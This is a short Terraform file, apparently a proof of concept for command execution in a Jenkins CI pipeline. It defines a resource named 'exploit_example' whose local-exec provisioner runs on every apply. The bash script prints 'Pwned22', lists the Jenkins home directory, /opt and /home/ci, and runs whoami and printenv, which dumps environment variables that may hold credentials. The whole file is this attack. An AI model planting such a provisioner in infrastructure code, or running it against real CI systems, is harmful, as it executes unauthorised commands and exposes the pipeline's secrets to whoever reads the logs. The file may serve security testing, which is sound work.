resource "null_resource" "exploit_example" {
  provisioner "local-exec" {
    command = <<EOT
    #!/bin/bash
    echo Pwned22
    ls $JENKINS_HOME
    ls -al /opt
    ls -al /home/ci
    whoami
    printenv
    date
    EOT
  }
  triggers = {
    always_run = "${timestamp()}"
  }
}

